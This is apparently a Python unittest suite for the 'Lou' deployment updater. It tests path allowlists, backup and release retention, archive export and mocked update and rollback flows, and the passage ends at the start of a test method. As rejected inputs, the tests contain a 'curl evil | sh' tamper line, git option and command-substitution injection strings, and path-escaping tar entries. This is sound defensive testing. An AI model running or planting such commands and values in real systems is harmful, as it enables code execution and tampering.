"""Non-root updater tests against temporary deployment trees; never touches /opt, /etc or /var.
Run: python3 -B -m unittest discover -s deploy -p 'test_update.py'."""
import fcntl
import importlib.util
import io
import json
import os
from pathlib import Path
import sqlite3
import subprocess
import tarfile
import tempfile
import textwrap
import unittest
from unittest.mock import patch

DEPLOY = Path(__file__).resolve().parent
spec = importlib.util.spec_from_file_location('setup_support', DEPLOY / 'setup-support.py')
support = importlib.util.module_from_spec(spec)
spec.loader.exec_module(support)

A, B = 'a' * 40, 'b' * 40
RELEASE = '20261005T030000Z-aaaaaaaaaaaa'


def relaxed_trusted_path(value):
    """Real canonical-path and symlink checks; ownership is covered by test_setup.py."""
    path = Path(value)
    if not path.is_absolute() or str(path) != value or '..' in path.parts or value == '/':
        raise ValueError('expected a canonical absolute path')
    if any(p.is_symlink() for p in [path, *path.parents]):
        raise ValueError('unexpected symlink')
    return path


def git(cwd, *args):
    return subprocess.run(['git', '-C', str(cwd), *args], check=True, capture_output=True, text=True).stdout.strip()


def sqlite_image(path, rows=3):
    with sqlite3.connect(path) as db:
        db.execute('create table t(x)')
        db.executemany('insert into t values (?)', [(i,) for i in range(rows)])
    db.close()
    return Path(path).read_bytes()


class TreeTest(unittest.TestCase):
    """A fake root containing opt/, var/lib/lou-updater and Lou's data/config."""

    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name).resolve()
        for name in ('opt/lou', 'opt/lou-releases', 'var/lib/lou-updater/backups', 'var/lib/lou', 'etc/lou'):
            (self.root / name).mkdir(parents=True)
        (self.root / 'var/lib/lou/lou.db').write_text('data')
        (self.root / 'etc/lou/lou.env').write_text('LOU_MASTER_KEY="secret"\n')
        for target, value in ((support, 'ROOT'), (support, 'OWNER'), (support, 'trusted_path')):
            original = getattr(target, value)
            self.addCleanup(setattr, target, value, original)
        support.ROOT = self.root
        support.OWNER = os.getuid()
        support.trusted_path = relaxed_trusted_path
        self.opt = self.root / 'opt'
        self.app = self.opt / 'lou'
        self.releases = self.opt / 'lou-releases'
        self.backups = self.root / 'var/lib/lou-updater/backups'

    def assert_data_untouched(self):
        self.assertEqual((self.root / 'var/lib/lou/lou.db').read_text(), 'data')
        self.assertEqual((self.root / 'etc/lou/lou.env').read_text(), 'LOU_MASTER_KEY="secret"\n')


class PathTests(TreeTest):
    def test_only_exact_deployment_locations_are_accepted(self):
        stage = self.opt / '.lou-build.Ab3dEf9h'
        self.assertEqual(support.deployment_path(str(self.app), ('app',))[0], 'app')
        self.assertEqual(support.deployment_path(str(stage), ('stage',))[0], 'stage')
        self.assertEqual(support.deployment_path(str(self.releases / RELEASE), ('release',))[0], 'release')
        unsafe = ['', '/', '.', '..', 'relative', 'opt/lou', '/opt/lou', str(self.app) + '/',
                  str(self.opt) + '//lou', str(self.app / '..' / 'lou'), str(self.root / 'var/lib/lou'),
                  str(self.root / 'etc/lou'), str(self.opt), str(self.releases), str(self.opt / '.lou-build.short'),
                  str(self.opt / '.lou-build.Ab3dEf9h/x'), str(self.releases / '20261005T030000Z-ZZZZZZZZZZZZ'),
                  str(self.releases / (RELEASE + '/../lou')), str(self.releases / '../../etc'),
                  str(self.releases / ('x' + RELEASE)), str(self.opt / 'lou-releases2' / RELEASE)]
        for value in unsafe:
            with self.subTest(value=value), self.assertRaises(ValueError):
                support.deployment_path(value, ('app', 'stage', 'release'))
        with self.assertRaises(ValueError):
            support.deployment_path(str(stage), ('app', 'release'))

    def test_symlinked_ancestors_are_rejected(self):
        (self.root / 'elsewhere').mkdir()
        self.releases.rmdir()
        self.releases.symlink_to(self.root / 'elsewhere', target_is_directory=True)
        with self.assertRaises(ValueError):
            support.deployment_path(str(self.releases / RELEASE), ('release',))

    def test_moves_follow_the_activation_allowlist(self):
        (self.app / 'marker').write_text('old')
        stage = self.opt / '.lou-build.Ab3dEf9h'
        stage.mkdir()
        (stage / 'marker').write_text('new')
        previous = self.releases / RELEASE
        support.move_tree(str(self.app), str(previous))
        support.move_tree(str(stage), str(self.app))
        self.assertEqual((self.app / 'marker').read_text(), 'new')
        self.assertEqual((previous / 'marker').read_text(), 'old')
        other = self.opt / '.lou-build.Zz9yXx8w'
        other.mkdir()
        bad = [(str(previous), str(self.app)),            # destination exists
               (str(other), str(self.releases / ('20261005T040000Z-' + 'b' * 12))),  # stage→release not allowed
               (str(previous), str(other)),               # release→stage not allowed
               (str(self.app), str(self.root / 'var/lib/lou/x')),
               (str(self.root / 'var/lib/lou'), str(self.app)),
               (str(other), '/'), ('', str(self.app))]
        for source, target in bad:
            with self.subTest(source=source, target=target), self.assertRaises(ValueError):
                support.move_tree(source, target)
        self.assertEqual((self.app / 'marker').read_text(), 'new')
        self.assert_data_untouched()

    def test_move_rejects_a_symlink_source(self):
        real = self.root / 'real'
        real.mkdir()
        stage = self.opt / '.lou-build.Ab3dEf9h'
        stage.symlink_to(real, target_is_directory=True)
        self.app.rmdir()
        with self.assertRaises(ValueError):
            support.move_tree(str(stage), str(self.app))
        self.assertTrue(stage.is_symlink())
        self.assertFalse(os.path.lexists(self.app))

    def test_remove_never_follows_links_or_touches_the_active_app(self):
        outside = self.root / 'outside'
        outside.mkdir()
        (outside / 'keep').write_text('keep')
        stage = self.opt / '.lou-build.Ab3dEf9h'
        (stage / 'node_modules').mkdir(parents=True)
        (stage / 'node_modules/dir-link').symlink_to(outside, target_is_directory=True)
        (stage / 'file-link').symlink_to(outside / 'keep')
        support.remove_tree(str(stage))
        self.assertFalse(stage.exists())
        self.assertEqual((outside / 'keep').read_text(), 'keep')
        linked = self.releases / RELEASE
        linked.symlink_to(outside, target_is_directory=True)
        for value in [str(linked), str(self.app), str(self.root / 'var/lib/lou'), str(self.root / 'etc/lou'),
                      str(self.opt), str(self.releases), '/', '']:
            with self.subTest(value=value), self.assertRaises((ValueError, OSError)):
                support.remove_tree(value)
        self.assertTrue((outside / 'keep').exists())
        self.assertTrue(self.app.is_dir())
        self.assert_data_untouched()

    def test_release_retention_is_allowlisted(self):
        names = [f'2026100{d}T030000Z-{c * 12}' for d, c in zip(range(1, 6), 'abcde')]
        for name in names:
            (self.releases / name).mkdir()
            (self.releases / name / 'file').write_text(name)
        (self.releases / 'admin-notes').mkdir()
        target = self.root / 'precious'
        target.mkdir()
        (self.releases / '20261001T000000Z-unknown').symlink_to(target, target_is_directory=True)
        with patch('sys.stdout', new_callable=io.StringIO) as out:
            support.prune_releases(2, names[0])
        self.assertEqual(out.getvalue().split(), names[1:3])
        remaining = sorted(p.name for p in self.releases.iterdir())
        self.assertEqual(remaining, sorted([names[0], *names[3:], 'admin-notes', '20261001T000000Z-unknown']))
        self.assertTrue(target.is_dir())
        with self.assertRaises(ValueError):
            support.prune_releases(0)

    def test_backup_retention_removes_only_updater_backups(self):
        names = [f'lou-pre-update-2026100{d}T030000Z-{"a" * 12}-{"b" * 12}.db' for d in range(1, 6)]
        for name in names:
            (self.backups / name).write_text(name)
        (self.backups / 'manual-backup.db').write_text('mine')
        precious = self.root / 'precious.db'
        precious.write_text('x')
        linked = 'lou-pre-update-20260101T030000Z-unknown-' + 'c' * 12 + '.db'
        (self.backups / linked).symlink_to(precious)
        hard = 'lou-pre-update-20260102T030000Z-unknown-' + 'd' * 12 + '.db'
        os.link(self.root / 'precious.db', self.backups / hard)
        with patch('sys.stdout', new_callable=io.StringIO):
            support.prune_backups(3)
        remaining = sorted(p.name for p in self.backups.iterdir())
        self.assertEqual(remaining, sorted([*names[2:], 'manual-backup.db', linked, hard]))
        self.assertEqual(precious.read_text(), 'x')

    def test_backup_writer_validates_and_never_overwrites(self):
        image = sqlite_image(self.root / 'source.db')
        name = 'lou-pre-update-20261005T030000Z-' + 'a' * 12 + '-' + 'b' * 12 + '.db'
        size = support.write_backup(name, io.BytesIO(image))
        backup = self.backups / name
        self.assertEqual(size, len(image))
        self.assertEqual(backup.stat().st_mode & 0o777, 0o600)
        with sqlite3.connect(backup) as db:
            self.assertEqual(db.execute('select count(*) from t').fetchone()[0], 3)
        db.close()
        with self.assertRaises(FileExistsError):
            support.write_backup(name, io.BytesIO(image))
        self.assertEqual(backup.read_bytes(), image)
        truncated = name.replace('b' * 12, 'c' * 12)
        with self.assertRaises(ValueError):
            support.write_backup(truncated, io.BytesIO(image[:-100]))
        self.assertFalse((self.backups / truncated).exists())
        for bad_name, data in [('../escape.db', image), ('lou.db', image), (truncated, b'not sqlite' * 20)]:
            with self.subTest(name=bad_name), self.assertRaises(ValueError):
                support.write_backup(bad_name, io.BytesIO(data))
        target = self.root / 'target'
        target.write_text('keep')
        linked = name.replace('b' * 12, 'd' * 12)
        (self.backups / linked).symlink_to(target)
        with self.assertRaises(OSError):
            support.write_backup(linked, io.BytesIO(image))
        self.assertEqual(target.read_text(), 'keep')


class SourceTests(TreeTest):
    def journal(self, app, entries):
        path = Path(app) / support.JOURNAL
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(json.dumps({'entries': [{'idx': i, 'tag': t, 'when': w} for i, (t, w) in enumerate(entries)]}))

    def test_migration_counts_and_rollback_safety(self):
        self.journal(self.app, [('0000_initial', 100)])
        stage = self.opt / '.lou-build.Ab3dEf9h'
        self.journal(stage, [('0000_initial', 100), ('0001_more', 200)])
        self.assertEqual(support.new_migrations(str(self.app), str(stage)), 1)
        self.assertEqual(support.new_migrations(str(self.root / 'missing'), str(stage)), 2)
        self.assertEqual(support.migration_state(str(self.app), ''), 'safe')
        self.assertEqual(support.migration_state(str(self.app), '100'), 'safe')
        self.assertEqual(support.migration_state(str(self.app), '200\n'), 'migrated')
        for value in ['abc', '-1', '1e9']:
            with self.subTest(value=value), self.assertRaises(ValueError):
                support.migration_state(str(self.app), value)
        self.journal(stage, [('../evil', 1)])
        with self.assertRaises(ValueError):
            support.new_migrations(str(self.app), str(stage))

    def repo(self, files, executable=()):
        repo = self.root / 'repo'
        repo.mkdir()
        git(repo, 'init', '-q', '-b', 'main')
        git(repo, 'config', 'user.email', 'test@example.com')
        git(repo, 'config', 'user.name', 'Test')
        for name, text in files.items():
            (repo / name).parent.mkdir(parents=True, exist_ok=True)
            (repo / name).write_text(text)
        for name in executable:
            (repo / name).chmod(0o755)
        git(repo, 'add', '-A', '-f')
        git(repo, 'commit', '-q', '-m', 'initial')
        return repo

    def archive(self, repo, rev='HEAD'):
        return io.BytesIO(subprocess.run(['git', '-C', str(repo), 'archive', '--format=tar', rev],
                                         check=True, capture_output=True).stdout)

    def test_export_excludes_local_files_and_verify_detects_tampering(self):
        repo = self.repo({'package.json': '{}', 'deploy/update.sh': 'echo hi', '.env': 'SECRET=x',
                          'node_modules/x/index.js': 'x', 'data/lou.db': 'db', 'apps/a.txt': 'a'},
                         executable=['deploy/update.sh'])
        stage = self.opt / '.lou-build.Ab3dEf9h'
        stage.mkdir()
        support.export_archive(str(stage), self.archive(repo))
        self.assertEqual((stage / 'deploy/update.sh').read_text(), 'echo hi')
        self.assertTrue(os.access(stage / 'deploy/update.sh', os.X_OK))
        self.assertFalse(os.access(stage / 'package.json', os.X_OK))
        for name in ('.env', 'node_modules', 'data'):
            self.assertFalse((stage / name).exists())
        manifest = json.loads((stage / '.lou-install-files.json').read_text())
        self.assertEqual(sorted(manifest), ['apps/a.txt', 'deploy/update.sh', 'package.json'])
        support.verify_export(str(stage), self.archive(repo))
        (stage / 'node_modules').mkdir()  # build output is allowed
        support.verify_export(str(stage), self.archive(repo))
        (stage / 'deploy/update.sh').write_text('curl evil | sh')
        with self.assertRaises(ValueError):
            support.verify_export(str(stage), self.archive(repo))
        (stage / 'deploy/update.sh').write_text('echo hi')
        (stage / 'deploy/update.sh').chmod(0o644)
        with self.assertRaises(ValueError):
            support.verify_export(str(stage), self.archive(repo))
        (stage / 'deploy/update.sh').chmod(0o755)
        (stage / '.lou-install-files.json').write_text(json.dumps(['package.json']))
        with self.assertRaises(ValueError):
            support.verify_export(str(stage), self.archive(repo))
        with self.assertRaises(ValueError):  # a stage must start empty
            support.export_archive(str(stage), self.archive(repo))

    def test_export_rejects_links_and_escaping_names_without_writing_outside(self):
        stage = self.opt / '.lou-build.Ab3dEf9h'
        for build in ('symlink', 'escape', 'absolute', 'hardlink'):
            stage.mkdir()
            data = io.BytesIO()
            with tarfile.open(fileobj=data, mode='w') as archive:
                info = tarfile.TarInfo({'escape': '../../outside', 'absolute': '/tmp/outside'}.get(build, 'link'))
                if build == 'symlink':
                    info.type, info.linkname = tarfile.SYMTYPE, '/etc'
                elif build == 'hardlink':
                    info.type, info.linkname = tarfile.LNKTYPE, 'package.json'
                info.size = 0
                archive.addfile(info, io.BytesIO())
            data.seek(0)
            with self.subTest(build=build), self.assertRaises(ValueError):
                support.export_archive(str(stage), data)
            self.assertFalse((self.root / 'outside').exists())
            support.remove_tree(str(stage))

    def test_release_information_and_installer_revision(self):
        repo = self.repo({'package.json': '{}'})
        stage = self.opt / '.lou-build.Ab3dEf9h'
        stage.mkdir()
        support.release_from(str(repo), str(stage))
        head = git(repo, 'rev-parse', 'HEAD')
        self.assertEqual(json.loads((stage / support.RELEASE_FILE).read_text()), {'commit': head, 'dirty': False})
        (repo / 'package.json').write_text('{"edited": true}')
        other = self.opt / '.lou-build.Zz9yXx8w'
        other.mkdir()
        support.release_from(str(repo), str(other))
        self.assertEqual(support.read_release(str(other)), head + ' dirty')
        with self.assertRaises(FileExistsError):
            support.write_release(str(other), A, False)
        # A rerun from an installed snapshot carries the recorded revision forward.
        snapshot_stage = self.opt / '.lou-build.Qq1wWe2r'
        snapshot_stage.mkdir()
        support.release_from(str(stage), str(snapshot_stage))
        self.assertEqual(support.read_release(str(snapshot_stage)), head + ' clean')
        self.assertEqual(support.read_release(str(self.app)), 'unknown')
        (self.app / support.RELEASE_FILE).write_text('{"commit": "../../x", "dirty": false}')
        self.assertEqual(support.read_release(str(self.app)), 'unknown')
        for commit, dirty in [('abc', False), (A.upper(), False), (A, 'no')]:
            with self.subTest(commit=commit), self.assertRaises(ValueError):
                support.write_release(str(self.opt / '.lou-build.Pp0oOi9u'), commit, dirty)

    def test_update_source_validation_and_detection(self):
        for url in ['https://github.com/a-riceeater/lou.git', 'https://git.example.com:8443/team/lou']:
            self.assertEqual(support.update_url(url), url)
        for url in ['http://github.com/x/lou.git', 'git@github.com:x/lou.git', 'ssh://github.com/x/lou',
                    'file:///srv/lou', 'https://user:token@github.com/x/lou.git', 'https://github.com',
                    'https://github.com/x/lou.git?ref=evil', 'https://github.com/../lou', 'https://github.com/x lou',
                    '--upload-pack=evil', 'https://github.com/x/lou.git#frag', 'HTTPS://github.com/x/lou']:
            with self.subTest(url=url), self.assertRaises(ValueError):
                support.update_url(url)
        for branch in ['main', 'release/1.2', 'feature_x-y']:
            self.assertEqual(support.update_branch(branch), branch)
        for branch in ['', '-main', 'a..b', 'a//b', 'a/.hidden', 'x.lock', 'HEAD', 'ma in', 'main~1', 'main@{1}', 'a/']:
            with self.subTest(branch=branch), self.assertRaises(ValueError):
                support.update_branch(branch)
        conf = self.root / 'etc/lou/update.conf'
        conf.write_text('LOU_UPDATE_REMOTE="https://github.com/a-riceeater/lou.git"\nLOU_UPDATE_BRANCH="main"\n')
        self.assertEqual(support.update_config(str(conf)), ('https://github.com/a-riceeater/lou.git', 'main'))
        for text in ['LOU_UPDATE_REMOTE="https://github.com/x/lou.git"\n',
                     'LOU_UPDATE_REMOTE="https://github.com/x/lou.git"\nLOU_UPDATE_BRANCH="main"\nGIT_SSH="evil"\n',
                     'LOU_UPDATE_REMOTE="file:///tmp/x"\nLOU_UPDATE_BRANCH="main"\n',
                     'LOU_UPDATE_REMOTE=$(evil)\nLOU_UPDATE_BRANCH="main"\n']:
            conf.write_text(text)
            with self.subTest(text=text), self.assertRaises(ValueError):
                support.update_config(str(conf))
        repo = self.repo({'package.json': '{}'})
        self.assertEqual(support.detect_update_source(str(repo)), ('', ''))
        git(repo, 'remote', 'add', 'origin', 'https://github.com/a-riceeater/lou.git')
        git(repo, 'config', 'branch.main.remote', 'origin')
        git(repo, 'config', 'branch.main.merge', 'refs/heads/main')
        self.assertEqual(support.detect_update_source(str(repo)), ('https://github.com/a-riceeater/lou.git', 'main'))
        git(repo, 'remote', 'set-url', 'origin', 'git@github.com:a-riceeater/lou.git')
        self.assertEqual(support.detect_update_source(str(repo)), ('', 'main'))

    def test_node_engine_requirement(self):
        (self.app / 'package.json').write_text(json.dumps({'engines': {'node': '>=22.12'}}))
        self.assertEqual(support.engine_satisfied(str(self.app), 'v24.1.0'), (True, '>=22.12'))
        self.assertEqual(support.engine_satisfied(str(self.app), 'v22.11.9'), (False, '>=22.12'))
        self.assertEqual(support.engine_satisfied(str(self.app), 'v22.12.0')[0], True)
        (self.app / 'package.json').write_text(json.dumps({'engines': {'node': '^22 || ^24'}}))
        with self.assertRaises(ValueError):
            support.engine_satisfied(str(self.app), 'v24.1.0')


SHIM = '''
import importlib.util, os, sys
from pathlib import Path
spec = importlib.util.spec_from_file_location('setup_support', sys.argv[1])
support = importlib.util.module_from_spec(spec)
spec.loader.exec_module(support)
tests = importlib.util.spec_from_file_location('test_update', sys.argv[2])
helpers = importlib.util.module_from_spec(tests)
tests.loader.exec_module(helpers)
support.ROOT = Path(sys.argv[3])
support.OWNER = os.getuid()
support.trusted_path = helpers.relaxed_trusted_path
sys.argv = [sys.argv[1], *sys.argv[4:]]
try:
    support.main()
except Exception as err:
    print('shim:', type(err).__name__, err, file=sys.stderr)
    sys.exit(1)
'''

# Mocks for systemd, curl and the sandboxed helpers. State lives in files so
# rollback/verification logic sees consistent answers; every call is logged.
MOCKS = r'''
SYSLOG=$ROOT/systemctl.log
systemctl() {
    printf '%s\n' "$*" >> "$SYSLOG"
    case $1 in
        is-active) [[ $(cat "$ROOT/state") == active ]] ;;
        show)
            case $4 in
                ActiveState) cat "$ROOT/state" ;;
                MainPID) printf 1234 ;;
                NRestarts) printf 0 ;;
            esac ;;
        stop) [[ $2 == lou ]] && printf inactive > "$ROOT/state"; return 0 ;;
        start) printf active > "$ROOT/state" ;;
        *) return 0 ;;
    esac
}
journalctl() { :; }
sleep() { :; }
curl() {
    # Healthy only when the active tree is the expected release.
    if [[ -f $APP/.healthy && $(cat "$ROOT/state") == active ]]; then
        printf '{"status":"ok","db":"ok"}'
    else
        return 7
    fi
}
check_runtime() { NPM=npm; }
build_in_sandbox() {
    local stage=$1
    shift
    printf 'build %s\n' "$*" >> "$SYSLOG"
    [[ -z ${FAIL_BUILD:-} || $* != *"$FAIL_BUILD"* ]] || { printf 'npm ERR! simulated failure\n'; return 1; }
    if [[ $* == *build* ]]; then
        mkdir -p "$stage/apps/server/dist/drizzle/meta"
        : > "$stage/apps/server/dist/index.js"
        : > "$stage/apps/server/dist/cli.js"
        cp "$stage/apps/server/drizzle/meta/_journal.json" "$stage/$JOURNAL"
        [[ -z ${CANDIDATE_HEALTHY:-} ]] || : > "$stage/.healthy"
    fi
}
lou_node() {
    printf 'lou_node %s\n' "$1" >> "$SYSLOG"
    if [[ $2 == "$BACKUP_JS" ]]; then cat "$3"; else printf '%s' "${DB_LATEST_MIGRATION:-}"; fi
}
'''


@unittest.skipUnless(os.name == 'posix' and subprocess.run(['sh', '-c', 'command -v flock'], capture_output=True).returncode == 0,
                     'bash, flock and GNU coreutils (Linux) are needed for updater flow tests')
class UpdaterFlowTests(TreeTest):
    def setUp(self):
        super().setUp()
        self.shim = self.root / 'shim.py'
        self.shim.write_text(SHIM)
        (self.root / 'var/lib/lou-updater').chmod(0o700)
        (self.root / 'var/cache/lou-build').mkdir(parents=True)
        (self.root / 'etc/systemd/system').mkdir(parents=True)
        (self.root / 'run').mkdir()
        (self.root / 'state').write_text('active')
        (self.root / 'var/lib/lou/lou.db').unlink()
        self.remote = self.root / 'remote'
        self.remote.mkdir()
        git(self.remote, 'init', '-q', '-b', 'main')
        git(self.remote, 'config', 'user.email', 'test@example.com')
        git(self.remote, 'config', 'user.name', 'Test')
        self.files = {
            'package.json': json.dumps({'name': 'lou', 'engines': {'node': '>=22.12'}}),
            'package-lock.json': '{}',
            'apps/server/package.json': json.dumps({'name': '@lou/server'}),
            'deploy/update.sh': '#!/bin/sh\n',
            'deploy/lou.service': '[Service]\n',
        }
        self.old = self.commit({'apps/server/drizzle/meta/_journal.json': self.journal_text(1)})
        self.new = self.commit({'apps/server/drizzle/meta/_journal.json': self.journal_text(1), 'feature.txt': 'new'})
        # The installed release is the old commit, recorded by the installer.
        subprocess.run(f'git -C {self.remote} archive {self.old} | tar -x -C {self.app}', shell=True, check=True)
        (self.app / support.JOURNAL).parent.mkdir(parents=True)
        (self.app / support.JOURNAL).write_text(self.journal_text(1))
        (self.app / support.RELEASE_FILE).write_text(json.dumps({'commit': self.old, 'dirty': False}))
        (self.app / '.healthy').write_text('')
        (self.app / 'marker').write_text('old release')
        (self.root / 'etc/systemd/system/lou.service').write_text('[Service]\n')
        (self.root / 'etc/lou/update.conf').write_text(
            'LOU_UPDATE_REMOTE="https://github.com/a-riceeater/lou.git"\nLOU_UPDATE_BRANCH="main"\n')

    def journal_text(self, count):
        entries = [{'idx': i, 'tag': f'000{i}_m', 'when': 100 * (i + 1)} for i in range(count)]
        return json.dumps({'entries': entries})

    def commit(self, extra):
        for name, text in {**self.files, **extra}.items():
            (self.remote / name).parent.mkdir(parents=True, exist_ok=True)
            (self.remote / name).write_text(text)
        git(self.remote, 'add', '-A')
        git(self.remote, 'commit', '-q', '-m', 'change')
        return git(self.remote, 'rev-parse', 'HEAD')

    def run_flow(self, code='update_flow', env=None, stdin=''):
        script = textwrap.dedent(f'''
            source "$1"
            ROOT={self.root}
            OPT=$ROOT/opt APP=$ROOT/opt/lou RELEASES=$ROOT/opt/lou-releases
            DATA=$ROOT/var/lib/lou CONFIG=$ROOT/etc/lou SYSTEMD_DIR=$ROOT/etc/systemd/system
            UNIT=$SYSTEMD_DIR/lou.service UPDATE_CONF=$CONFIG/update.conf DB=$DATA/lou.db
            UPDATE_STATE=$ROOT/var/lib/lou-updater MIRROR=$UPDATE_STATE/source.git BACKUPS=$UPDATE_STATE/backups
            UPDATE_LOCK=$UPDATE_STATE/lock FAILED_FILE=$UPDATE_STATE/failed-revision SETUP_LOCK=$ROOT/run/lou-setup.lock
            BUILD_CACHE=$ROOT/var/cache/lou-build BUILDER=$(id -un) ADMIN_UID=$(id -u)
            BUILD_LOG=$ROOT/build.log SUPPORT={DEPLOY / 'setup-support.py'}
            support() {{
                case $1 in freeze|validate) return 0 ;; esac
                python3 -B {self.shim} {DEPLOY / 'setup-support.py'} {Path(__file__).resolve()} "$ROOT" "$@"
            }}
            check_path() {{ support path "$1"; }}
            # The real git_mirror allows HTTPS only; tests fetch a local repository.
            git_mirror() {{
                local args=() arg
                for arg; do [[ $arg == "$REMOTE" ]] && arg={self.remote}; args+=("$arg"); done
                git -c protocol.file.allow=always --git-dir="$MIRROR" "${{args[@]}}"
            }}
            {MOCKS}
            trap on_exit EXIT
            trap 'on_failure $?' ERR
            trap 'on_signal 130' INT
            trap 'on_signal 143' TERM
            {code}
        ''')
        environment = {**os.environ, **(env or {})}
        return subprocess.run(['bash', '-c', script, 'test', str(DEPLOY / 'update.sh')],
                              input=stdin, text=True, capture_output=True, env=environment, timeout=120)

    def syslog(self):
        path = self.root / 'systemctl.log'
        return path.read_text().splitlines() if path.exists() else []

    def stages(self):
        return sorted(p.name for p in self.opt.iterdir() if p.name.startswith('.lou-build.'))

    def test_check_reports_update_without_changes(self):
        result = self.run_flow('MODE=check; update_flow')
        self.assertEqual(result.returncode, 10, result.stderr)
        self.assertIn(f'Current revision:   {self.old[:7]}', result.stdout)
        self.assertIn(f'Available revision: {self.new[:7]}', result.stdout)
        self.assertIn('Update available.', result.stdout)
        self.assertNotIn('stop lou', self.syslog())
        self.assertEqual(self.stages(), [])
        self.assertEqual((self.app / 'marker').read_text(), 'old release')

    def test_no_update_is_a_quiet_success(self):
        (self.app / support.RELEASE_FILE).write_text(json.dumps({'commit': self.new, 'dirty': False}))
        result = self.run_flow('ASSUME_YES=true; update_flow')
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn('Lou is up to date.', result.stdout)
        self.assertFalse(any(line.startswith('build') for line in self.syslog()))
        self.assertNotIn('stop lou', self.syslog())
        self.assertEqual(self.stages(), [])

    def test_status_reports_the_last_unattended_run_and_its_log(self):
        invocation = '0' * 31 + '7'
        result = self.run_flow(rf'''
            systemctl() {{
                case $4 in
                    ActiveState) printf inactive ;;
                    ExecMainStatus) printf 4 ;;
                    ExecMainExitTimestamp) printf 'Mon 2026-10-05 03:12:00 UTC' ;;
                    InvocationID) printf {invocation} ;;
                esac
            }}
            journalctl() {{ [[ $1 == _SYSTEMD_INVOCATION_ID={invocation} ]] && printf 'Automatic update declined\n'; }}
            print_status''')
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn('Last update run: Mon 2026-10-05 03:12:00 UTC, declined; run sudo /opt/lou/deploy/update.sh to decide', result.stdout)
        self.assertIn('Automatic update declined', result.stdout)

    def test_status_without_a_run_since_boot(self):
        result = self.run_flow('print_status')
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn('Last update run: none since boot', result.stdout)

    def test_successful_update_activates_backs_up_and_prunes(self):
        sqlite_image(self.root / 'var/lib/lou/lou.db')
        database = (self.root / 'var/lib/lou/lou.db').read_bytes()
        for day in range(1, 4):
            (self.releases / f'2000010{day}T030000Z-{"c" * 12}').mkdir()
        (self.root / 'var/lib/lou-updater/failed-revision').write_text(A + '\n')
        result = self.run_flow('ASSUME_YES=true; update_flow', env={'CANDIDATE_HEALTHY': '1'})
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
        self.assertIn('Lou updated successfully', result.stdout)
        self.assertEqual((self.app / 'feature.txt').read_text(), 'new')
        self.assertEqual(support.read_release(str(self.app)), self.new + ' clean')
        releases = sorted(p.name for p in self.releases.iterdir())
        self.assertEqual(len(releases), 2)
        self.assertTrue(releases[-1].endswith(self.old[:12]))
        self.assertEqual((self.releases / releases[-1] / 'marker').read_text(), 'old release')
        backups = list(self.backups.iterdir())
        self.assertEqual(len(backups), 1)
        self.assertEqual(backups[0].read_bytes(), database)
        self.assertEqual((self.root / 'var/lib/lou/lou.db').read_bytes(), database)
        self.assertFalse((self.root / 'var/lib/lou-updater/failed-revision').exists())
        log = self.syslog()
        # Downtime starts only after dependencies, build and backup succeeded.
        self.assertLess(log.index('build npm run build -w @lou/server'), log.index('stop lou'))
        self.assertLess(log.index(f'lou_node {self.app}'), log.index('stop lou'))
        self.assertEqual(self.stages(), [])

    def test_failed_build_leaves_lou_running_and_untouched(self):
        result = self.run_flow('ASSUME_YES=true; update_flow', env={'FAIL_BUILD': 'run build'})
        self.assertEqual(result.returncode, 1)
        self.assertIn('simulated failure', result.stderr)
        self.assertIn('was not changed and is still running', result.stderr)
        self.assertNotIn('stop lou', self.syslog())
        self.assertEqual(self.stages(), [])
        self.assertEqual((self.app / 'marker').read_text(), 'old release')
        self.assertEqual(list(self.releases.iterdir()), [])

    def test_failed_health_check_restores_previous_release(self):
        result = self.run_flow('ASSUME_YES=true; update_flow')
        self.assertEqual(result.returncode, 2, result.stdout + result.stderr)
        self.assertIn('failed its health check', result.stderr)
        self.assertIn(f'The previous release {self.old[:7]} was restored successfully.', result.stdout)
        self.assertEqual((self.app / 'marker').read_text(), 'old release')
        self.assertEqual(list(self.releases.iterdir()), [])
        self.assertEqual(self.stages(), [])
        self.assertEqual((self.root / 'var/lib/lou-updater/failed-revision').read_text().strip(), self.new)
        self.assertEqual((self.root / 'state').read_text(), 'active')
        # The same failed revision is not retried unattended.
        result = self.run_flow('ASSUME_YES=true; update_flow')
        self.assertEqual(result.returncode, 4)
        self.assertIn('failed verification before', result.stderr)

    def test_rollback_is_withheld_after_an_unknown_migration(self):
        sqlite_image(self.root / 'var/lib/lou/lou.db')
        self.new = self.commit({'apps/server/drizzle/meta/_journal.json': self.journal_text(2)})
        result = self.run_flow('ASSUME_YES=true; update_flow', env={'DB_LATEST_MIGRATION': '200'})
        self.assertEqual(result.returncode, 3, result.stdout + result.stderr)
        self.assertIn('Automatic rollback withheld', result.stderr)
        self.assertIn('Database backup:', result.stderr)
        # Lou stays stopped on the release that understands the migrated schema.
        self.assertEqual(support.read_release(str(self.app)), self.new + ' clean')
        self.assertEqual(len(list(self.releases.iterdir())), 1)
        self.assertEqual(len(list(self.backups.iterdir())), 1)
        self.assertEqual((self.root / 'state').read_text(), 'inactive')

    def test_rollback_proceeds_when_the_migration_was_not_applied(self):
        sqlite_image(self.root / 'var/lib/lou/lou.db')
        self.new = self.commit({'apps/server/drizzle/meta/_journal.json': self.journal_text(2)})
        # Drizzle migrates in one transaction; a failed start leaves the old schema.
        result = self.run_flow('ASSUME_YES=true; update_flow', env={'DB_LATEST_MIGRATION': '100'})
        self.assertEqual(result.returncode, 2, result.stdout + result.stderr)
        self.assertIn('restoring code is safe', result.stdout)
        self.assertEqual((self.app / 'marker').read_text(), 'old release')

    def test_recovery_after_activation_was_interrupted_between_renames(self):
        stage = self.opt / '.lou-build.Ab3dEf9h'
        previous = self.releases / RELEASE
        os.rename(self.app, previous)
        stage.mkdir()
        code = f'''CANDIDATE={self.new} CURRENT={self.old} STAGE={stage} PREVIOUS={previous}
                   WAS_ACTIVE=true INTERRUPTED=true PHASE=activate; rollback 'update was interrupted' '''
        result = self.run_flow(code)
        self.assertEqual(result.returncode, 2, result.stdout + result.stderr)
        self.assertEqual((self.app / 'marker').read_text(), 'old release')
        self.assertFalse(stage.exists())
        self.assertFalse((self.root / 'var/lib/lou-updater/failed-revision').exists())

    def test_unexpected_state_is_never_guessed(self):
